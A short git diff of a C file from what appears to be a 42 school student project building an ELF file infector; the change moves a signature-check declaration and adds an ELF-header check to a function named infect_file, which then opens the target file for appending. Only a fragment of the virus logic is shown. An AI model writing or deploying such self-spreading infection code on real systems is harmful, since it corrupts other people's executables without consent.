@@ -6,7 +6,7 @@
 /*   By: mbatty <mbatty@student.42angouleme.fr>     +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2026/03/04 11:29:15 by mbatty            #+#    #+#             */
-/*   Updated: 2026/04/14 18:22:35 by mbatty           ###   ########.fr       */
+/*   Updated: 2026/04/14 18:53:11 by mbatty           ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -19,7 +19,6 @@
 
 #define DIRENT_DIRECTORY 4
 
-int		check_signature(t_ctx *ctx, const char *path);
 char	*strjoin(char const *s1, char const *s2);
 
 uint64_t	min(uint64_t a, uint64_t b)
@@ -68,9 +67,13 @@ void	pack(t_ctx *ctx, const char *bin1_path, const char *bin2_path, const char *
 	close(resbin_fd);
 }
 
+int		check_signature(t_ctx *ctx, const char *path);
+int		check_elf_hdr(const char *path);
+
 int	infect_file(t_ctx *ctx, const char *path)
 {
-	if (check_signature(ctx, path) == -1)
+	if (check_signature(ctx, path) == -1
+		|| check_elf_hdr(path))
 		return (-1);
 
 	int	fd = open(path, O_WRONLY | O_APPEND);
